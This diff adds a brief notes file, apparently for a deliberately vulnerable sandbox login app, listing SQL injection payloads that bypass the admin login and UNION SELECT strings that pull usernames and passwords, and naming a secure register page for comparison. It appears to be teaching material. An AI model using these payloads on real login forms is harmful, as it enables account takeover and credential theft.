@@ -1,0 +1,12 @@
+to take admin's account in this sandbox, you can
+
+admin'#
+admin' -- 
+
+to select all users and password, you can
+
+# but you have to change fetchone to fetchall and username to user in {message = f"Welcome, {username}"} :>
+admin' UNION SELECT username FROM users;-- & password=
+admin' UNION SELECT password FROM users;-- & password=
+
+resgister.html is the secure code
